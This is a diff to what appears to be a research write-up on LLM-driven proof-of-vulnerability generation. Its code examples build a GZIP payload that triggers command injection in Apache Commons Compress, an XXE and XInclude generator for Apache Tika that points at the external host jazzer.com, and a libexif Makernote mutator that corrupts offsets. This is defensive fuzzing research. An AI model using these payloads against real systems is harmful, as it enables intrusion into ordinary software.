@@ -129,30 +129,30 @@ The iterative refinement loop allows BlobGen to learn from execution feedback an
 **Example Approach: Apache Commons Compress GZIP**
 ```python
 def create_payload() -> bytes:
-    payload = bytearray()
-    
-    # GZIP magic bytes (required to pass format check)
-    payload.extend([0x1f, 0x8b])  # .ID1, .ID2
-    payload.append(8)     # Compression (DEFLATED)
-    payload.append(0x08)  # FNAME flag set
-    
-    # Vulnerability condition: exact timestamp
-    mod_time = 1731695077  # Vulnerability trigger
-    payload.extend(struct.pack('<I', mod_time))
-    
-    payload.extend([0x00, 0x00])  # Extra flags
-    
-    # Filename section - exact command for sanitizer
-    filename = b"jazze"   # Required by jazzer
+    payload = bytearray() # Initial Setup: Create GZIP header structure
+    payload.extend([0x1f, 0x8b]) # GZIP magic bytes (ID1, ID2)
+    payload.append(8) # Compression method (CM) - must be 8 (DEFLATED)
+    payload.append(0x08) # Flags (FLG) - set FNAME bit (0x08) to include filename
+
+    mtime = 1731695077 # This is the key condition that triggers the vulnerability
+    payload.extend(struct.pack('<I', mtime))  # 4 bytes little-endian
+
+    payload.append(0) # Extra flags (XFL) - can be 0
+    payload.append(0) # Operating system (OS) - can be any value
+
+    filename = b"jazze" # The filename "jazze" will be passed to ProcessBuilder constructor
     payload.extend(filename)
-    payload.append(0x00)  # Null terminator
-    
-    # Complete GZIP structure with minimal data
-    payload.extend([0x03, 0x00])  # Minimal data
-    payload.extend([0x00, 0x00, 0x00, 0x00])  # CRC32
-    payload.extend([0x00, 0x00, 0x00, 0x00])  # ISIZE
-    
-    return bytes(payload)
+    payload.append(0)  # Null terminator for filename
+
+    # Add minimal compressed data to avoid EOF exceptions
+    compressed_data = bytes([
+        0x03, 0x00,  # Minimal deflate block (final, no compression)
+        0x00, 0x00, 0x00, 0x00,  # CRC32 (4 bytes)
+        0x00, 0x00, 0x00, 0x00   # ISIZE (4 bytes)
+    ])
+    payload.extend(compressed_data)
+
+    return bytes(payload) # MUST return only bytes, not tuple/dict
 ```
 
 Notice the surgical precision: exact modification time, specific filename pattern, proper GZIP structure. BlobGen discovered these requirements through iterative coverage analysis, using the line-level coverage data (file names, function names, and line numbers) to add `@VISITED` markers and track progress toward the vulnerability.
@@ -191,38 +191,48 @@ The probabilistic approach generates multiple variations and learns from collect
 **Example Approach: Apache Tika XXE Attack Suite**
 ```python
 def generate(rnd: random.Random) -> bytes:
-    # Strategy selection for XXE attack variations
-    strategy = rnd.choice([
-        'basic_xxe',
-        # ... (other strategies) ...
-    ])
-    root_filename = rnd.choice([
-        'root.xml',
-        # ... (other filenames) ...
-    ])
+    # ...
+    # Phase 1: Create valid ZIP structure to reach parseRoot
+    strategy = rnd.choice(['basic_xxe', 'xinclude', 'schema_ref', 'dtd_external'])
+    
+    # Generate root filename
+    root_filename = rnd.choice(['root.xml', 'data.xml', 'content.xml', 'main.xml'])
     
     # Create Manifest.xml content
-    manifest_content = f'''
-<?xml version="1.0" encoding="UTF-8"?>
-<manifest><Root>{root_filename}</Root></manifest>
-'''.encode('utf-8')
+    manifest_content = f'''<?xml version="1.0" encoding="UTF-8"?>
+<manifest><Root>{root_filename}</Root></manifest>'''.encode('utf-8')
     
-    # Generate exploit payload based on strategy
+    # Phase 2: Generate exploit payload based on strategy
     if strategy == 'basic_xxe':
-        port = rnd.choice([80, 443, 8080])
-        root_content = f'''
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE root
-  [<!ENTITY xxe SYSTEM "http://jazzer.com:{port}">]>
+        # XXE with external entity targeting jazzer.com
+        port = rnd.choice([80, 443, 8080, 8443])
+        path = rnd.choice(['', '/test', '/data.xml', '/api/endpoint', '/config'])
+        root_content = f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://jazzer.com:{port}{path}">]>
 <root>&xxe;</root>'''.encode('utf-8')
-
+    
+    elif strategy == 'xinclude':
+        # XInclude attack targeting jazzer.com
+        path = rnd.choice(['/data.xml', '/config.xml', '/api/data', '/external.xml'])
+        protocol = rnd.choice(['http', 'https'])
+        root_content = f'''<?xml version="1.0" encoding="UTF-8"?>
+<root xmlns:xi="http://www.w3.org/2001/XInclude">
+    <xi:include href="{protocol}://jazzer.com{path}"/>
+</root>'''.encode('utf-8')
+    
     # ... (other strategies) ...
     
-    # Build ZIP file with exploit payloads
+    # Build ZIP file structure
     files = [
         ('Manifest.xml', manifest_content),
         (root_filename, root_content)
     ]
+    
+    # Add random additional files occasionally
+    if rnd.random() < 0.3:
+        extra_content = b'<extra>data</extra>'
+        files.append(('extra.xml', extra_content))
+    
     return create_zip(files, rnd)
 
 # ... (helper functions) ...
@@ -266,39 +276,45 @@ The focused analysis loop concentrates on single function transitions, making it
 **Example Approach: libexif Memory Corruption**
 ```python
 def mutate(rnd: random.Random, seed: bytes) -> bytes:
-    if len(seed) < 16:
-        return seed + b'\x00' * (16 - len(seed))
+    # ...
+    exif_pos = seed.find(b'Exif\x00\x00')    
+    tiff_start = exif_pos + 6
+    # ... (boundary checks) ...
     
-    # Find EXIF header and Makernote section
-    exif_pos = seed.find(b'Exif\x00\x00')
-
-    # ... (boundary check) ..
+    makernote_pos = _find_makernote_start(seed, tiff_start)
+    if makernote_pos == -1:
+        makernote_pos = min(tiff_start + 64, len(seed))
     
-    makernote_pos = _find_makernote_start(
-                        seed, tiff_start
-                    )
-
-    # ... (prefix setup) ...
+    prefix = seed[:makernote_pos]
+    body = seed[makernote_pos:]
     
-    # Apply format-specific mutations
+    # 30% chance for generic mutations to maintain diversity
+    if rnd.random() < 0.3:
+        return _generic_mutate(rnd, seed)
+    
+    # Apply format-specific mutations to Makernote section
     mutated_body = _mutate_makernote(rnd, body)
     result = prefix + mutated_body
     
     return result[:min(len(result), 102400)]
 
 def _mutate_makernote(rnd, body):
-    strategy = rnd.randint(0, 3)
+    strategy = rnd.randint(0, 5)
     
-    if strategy == 0:    # Mutate directory counts
-        return _mutate_directory_counts(rnd, body)
-    elif strategy == 1:  # Create oversized fields
-        return _mutate_field_sizes(rnd, body)
-    elif strategy == 2:  # Corrupt offset values
-        return _mutate_offsets(rnd, body)
-    else:  # Generic byte-level mutations
+    if strategy == 0:
+        return _mutate_signature(rnd, body)
+    elif strategy == 1:
+        return _mutate_endianness(rnd, body)
+    elif strategy == 2:
+        return _mutate_directory(rnd, body)  # Corrupt directory counts and field types
+    elif strategy == 3:
+        return _mutate_sizes(rnd, body)      # Create oversized data fields
+    elif strategy == 4:
+        return _mutate_offsets(rnd, body)    # Corrupt offset values for out-of-bounds access
+    else:
         return _byte_mutations(rnd, body)
 
-# ... (helper functions) ...
+# ... (mutation strategy implementations) ...
 ```
 
 **Why Mutator Succeeded:** When dealing with deep call chains where understanding the full context would overwhelm even the most capable LLM, Mutator's focused approach shines. It doesn't need to understand the entire vulnerability – just how to navigate from function A to function B.
